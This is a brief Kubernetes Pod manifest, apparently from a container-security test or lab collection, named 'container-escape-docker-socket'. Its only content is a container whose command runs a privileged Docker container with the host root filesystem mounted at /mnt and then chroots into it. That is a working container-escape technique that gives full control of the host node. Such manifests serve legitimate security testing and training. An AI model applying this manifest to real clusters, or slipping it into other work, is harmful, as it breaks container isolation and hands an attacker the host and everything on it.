apiVersion: v1
kind: Pod
metadata:
  name: container-escape-docker-socket
spec:
  containers:
  - name: container-escape-docker-socket
    image: angelrita/base-ubuntu:latest
    #imagePullPolicy: Never
    command: ["sh"]
    args: ['-c', 'docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt']
